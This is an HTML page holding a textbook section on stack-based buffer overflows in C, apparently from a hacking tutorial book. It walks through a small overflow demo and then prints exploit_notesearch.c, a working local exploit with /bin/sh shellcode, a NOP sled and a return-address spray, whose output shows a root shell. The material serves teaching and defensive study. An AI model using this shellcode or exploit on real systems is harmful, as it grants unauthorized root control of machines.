<!DOCTYPE  html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>0x320 Buffer Overflows</title><link href="navigation.css" rel="stylesheet" type="text/css"/><link href="document.css" rel="stylesheet" type="text/css"/></head><body><p class="top_nav"><a href="part53.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part55.htm">Next &gt;</a></p><p class="s30" style="padding-top: 3pt;padding-left: 37pt;text-indent: 0pt;text-align: left;"><a name="bookmark44">0x320 Buffer Overflows</a></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">Buffer overflow vulnerabilities have been around since the early days of com- puters and still exist today. Most Internet worms use buffer overflow vulner- abilities to propagate, and even the most recent zero-day VML vulnerability in Internet Explorer is due to a buffer overflow.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">C is a high-level programming language, but it assumes that the programmer is responsible for data integrity. If this responsibility were shifted over to the compiler, the resulting binaries would be significantly slower, due to integrity checks on every variable. Also, this would remove a significant level of control from the programmer and complicate the language.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 107%;text-align: left;">While C’s simplicity increases the programmer’s control and the efficiency of the resulting programs, it can also result in programs that are vulnerable to buffer overflows and memory leaks if the programmer isn’t careful. This means that once a variable is allocated memory, there are no built-in safe- guards to ensure that the contents of a variable fit into the allocated memory space. If a programmer wants to put ten bytes of data into a buffer that had only been allocated eight bytes of space, that type of action is allowed, even though it will most likely cause the program to crash. This is known as a <span class="s27">buffer overrun </span>or <span class="s27">buffer overflow</span>, since the extra two bytes of data will overflow and spill out of the allocated memory, overwriting whatever happens to come next. If a critical piece of data is overwritten, the program will crash. The overflow_example.c code offers an example.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s40" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">overflow_example.c</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_329.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">#include &lt;stdio.h&gt; #include &lt;string.h&gt;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 32pt;text-indent: -12pt;text-align: left;">int main(int argc, char *argv[]) { int value = 5;</p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;text-align: left;">char buffer_one[8], buffer_two[8];</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;text-align: left;">strcpy(buffer_one, &quot;one&quot;); /* Put &quot;one&quot; into buffer_one. */ strcpy(buffer_two, &quot;two&quot;); /* Put &quot;two&quot; into buffer_two. */</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;line-height: 106%;text-align: justify;">printf(&quot;[BEFORE] buffer_two is at %p and contains \&#39;%s\&#39;\n&quot;, buffer_two, buffer_two); printf(&quot;[BEFORE] buffer_one is at %p and contains \&#39;%s\&#39;\n&quot;, buffer_one, buffer_one); printf(&quot;[BEFORE] value is at %p and is %d (0x%08x)\n&quot;, &amp;value, value, value);</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 32pt;text-indent: 0pt;line-height: 107%;text-align: left;">printf(&quot;\n[STRCPY] copying %d bytes into buffer_two\n\n&quot;,  strlen(argv[1])); strcpy(buffer_two, argv[1]); /* Copy first argument into buffer_two. */</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-top: 4pt;padding-left: 32pt;text-indent: 0pt;line-height: 107%;text-align: justify;">printf(&quot;[AFTER] buffer_two is at %p and contains \&#39;%s\&#39;\n&quot;, buffer_two, buffer_two); printf(&quot;[AFTER] buffer_one is at %p and contains \&#39;%s\&#39;\n&quot;, buffer_one, buffer_one); printf(&quot;[AFTER] value is at %p and is %d (0x%08x)\n&quot;, &amp;value, value, value);</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">}</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_330.png"/></span></p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: justify;">By now, you should be able to read the source code above and figure out what the program does. After compilation in the sample output below, we try to copy ten bytes from the first command-line argument into <span class="s31">buffer_two</span>, which only has eight bytes allocated for it.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_331.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: justify;">reader@hacking:~/booksrc $ gcc -o overflow_example overflow_example.c reader@hacking:~/booksrc $ ./overflow_example 1234567890</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 106%;text-align: justify;">[BEFORE] buffer_two is at 0xbffff7f0 and contains &#39;two&#39; [BEFORE] buffer_one is at 0xbffff7f8 and contains &#39;one&#39; [BEFORE] value is at 0xbffff804 and is 5 (0x00000005)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: justify;">[STRCPY] copying 10 bytes into buffer_two</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">[AFTER] buffer_two is at 0xbffff7f0 and contains &#39;1234567890&#39; [AFTER] buffer_one is at 0xbffff7f8 and contains &#39;90&#39; [AFTER] value is at 0xbffff804 and is 5 (0x00000005) reader@hacking:~/booksrc $</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_332.png"/></span></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">Notice that <span class="s31">buffer_one </span>is located directly after <span class="s31">buffer_two </span>in memory, so when ten bytes are copied into <span class="s31">buffer_two</span>, the last two bytes of <span class="s31">90 </span>overflow into <span class="s31">buffer_one </span>and overwrite whatever was there.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">A larger buffer will naturally overflow into the other variables, but if a large enough buffer is used, the program will crash and die.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_333.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ./overflow_example AAAAAAAAAAAAAAAAAAAAAAAAAAAAA [BEFORE] buffer_two is at 0xbffff7e0 and contains &#39;two&#39;</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">[BEFORE] buffer_one is at 0xbffff7e8 and contains &#39;one&#39; [BEFORE] value is at 0xbffff7f4 and is 5 (0x00000005)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">[STRCPY] copying 29 bytes into buffer_two</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">[AFTER] buffer_two is at 0xbffff7e0 and contains &#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 106%;text-align: left;">[AFTER] buffer_one is at 0xbffff7e8 and contains &#39;AAAAAAAAAAAAAAAAAAAAA&#39; [AFTER] value is at 0xbffff7f4 and is 1094795585 (0x41414141) Segmentation fault (core dumped)</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;line-height: 10pt;text-align: left;">reader@hacking:~/booksrc $</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_334.png"/></span></p><p style="padding-top: 6pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;"><a href="part45.htm#bookmark41" class="a">These types of program crashes are fairly common—think of all of the times a program has crashed or blue-screened on you. The programmer’s mistake is one of omission—there should be a length check or restriction on the user-supplied input. These kinds of mistakes are easy to make and can be difficult to spot. In fact, the notesearch.c program on page </a>93 contains a buffer overflow bug. You might not have noticed this until right now, even if you were already familiar with C.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_335.png"/></span></p><p class="s31" style="padding-top: 1pt;padding-left: 91pt;text-indent: 0pt;text-align: justify;">reader@hacking:~/booksrc $ ./notesearch AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;line-height: 106%;text-align: left;">-------[ end of note data ]------- Segmentation fault reader@hacking:~/booksrc $</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_336.png"/></span></p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Program crashes are annoying, but in the hands of a hacker they can become downright dangerous. A knowledgeable hacker can take control of a program as it crashes, with some surprising results. The exploit_notesearch.c code demonstrates the danger.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s40" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">exploit_notesearch.c</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_337.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 106%;text-align: left;">#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; char shellcode[]=</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 106%;text-align: justify;">&quot;\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68&quot; &quot;\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89&quot; &quot;\xe1\xcd\x80&quot;;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 104pt;text-indent: -12pt;line-height: 106%;text-align: left;">int main(int argc, char *argv[]) { unsigned int i, *ptr, ret, offset=270; char *command, *buffer;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">command = (char *) malloc(200);</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">bzero(command, 200); // Zero out the new memory.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;line-height: 107%;text-align: left;">strcpy(command, &quot;./notesearch \&#39;&quot;); // Start command buffer. buffer = command + strlen(command); // Set buffer at the end.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 116pt;text-indent: -12pt;line-height: 107%;text-align: left;">if(argc &gt; 1) // Set offset. offset = atoi(argv[1]);</p><p class="s31" style="padding-top: 1pt;padding-left: 104pt;text-indent: 0pt;line-height: 21pt;text-align: left;">ret = (unsigned int) &amp;i - offset; // Set return address. for(i=0; i &lt; 160; i+=4) // Fill buffer with return address.</p><p class="s31" style="padding-left: 116pt;text-indent: 0pt;line-height: 8pt;text-align: left;">*((unsigned int *)(buffer+i)) = ret;</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;line-height: 107%;text-align: left;">memset(buffer, 0x90, 60); // Build NOP sled. memcpy(buffer+60, shellcode, sizeof(shellcode)-1);</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">strcat(command, &quot;\&#39;&quot;);</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-top: 4pt;padding-left: 104pt;text-indent: 0pt;line-height: 107%;text-align: left;">system(command); // Run exploit. free(command);</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">}</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_338.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-top: 4pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">This exploit’s source code will be explained in depth later, but in general, it’s just generating a command string that will execute the notesearch pro- gram with a command-line argument between single quotes. It uses string functions to do this: <span class="s31">strlen() </span>to get the current length of the string (to position the buffer pointer) and <span class="s31">strcat() </span>to concatenate the closing single quote to the end. Finally, the system function is used to execute the command string. The buffer that is generated between the single quotes is the real meat of the exploit. The rest is just a delivery method for this poison pill of data. Watch what a controlled crash can do.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_339.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ gcc exploit_notesearch.c reader@hacking:~/booksrc $ ./a.out</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">[DEBUG] found a 34 byte note for user id 999 [DEBUG] found a 41 byte note for user id 999</p><p class="s31" style="padding-bottom: 2pt;padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">-------[ end of note data ]------- sh-3.2#</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_340.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: justify;">The exploit is able to use the overflow to serve up a root shell—providing full control over the computer. This is an example of a stack-based buffer overflow exploit.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="nav">&nbsp;&nbsp;</p><p class="nav">&nbsp;</p><p class="nav"><a href="part53.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part55.htm">Next &gt;</a></p><p class="nav">&nbsp;&nbsp;</p></body></html>
